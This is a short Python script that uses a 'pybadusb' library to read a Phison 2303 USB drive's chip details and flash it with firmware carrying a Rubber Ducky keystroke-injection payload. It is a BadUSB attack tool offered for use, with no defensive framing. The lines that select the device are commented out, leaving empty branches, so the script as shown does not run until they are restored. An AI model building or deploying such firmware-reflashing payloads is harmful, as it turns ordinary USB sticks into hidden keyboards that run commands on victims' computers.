from pybadusb import badusb, phison
import platform # to check OS

def print_info(device):
	info  = "\nInformation:\n"
	info += "Chip type: %04X\n" % device.chip_type
	info += "Chip ID:   %s\n" % device.chip_id
	info += "Version:   %d.%d.%d\n" % device.version
	info += "Mode:      %s\n" % device.run_mode
	print info

if __name__ == '__main__':
	payload  = 'rubberducky/inject.bin'
	firmware = 'bin/fw.bin'
	burner   = 'bin/BN03V114M.BIN'
	
	print 'Getting device..'
	if platform.system() == 'Windows':
		# For Windows:
		#device = badusb.get_device(phison.Phison2303, 'H')
		
		# Alternative:
		#device = badusb.find_drive(phison.Phison2303)
	else:
		# For Linux:
		#device = badusb.get_device(phison.Phison2303, '/dev/sg2')
	
	if not device:
		print 'Device not found!'
		exit()
	
	print 'Updating device data...'
	if not device.get_info():
		print 'Failed getting info!'
		device.close()
		exit()
	
	# display found data
	print_info(device)
	
	print 'Embeding payload and burning it...'
	if not badusb.badusb(device, payload, firmware, burner):
		print 'Failed burning payload!'
		exit()
	
	print 'Finished!'
	device.close()
